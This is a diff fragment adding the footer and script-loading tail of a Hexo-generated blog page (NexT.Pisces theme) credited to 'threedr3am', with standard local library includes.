+  <span class="author" itemprop="copyrightHolder">threedr3am</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
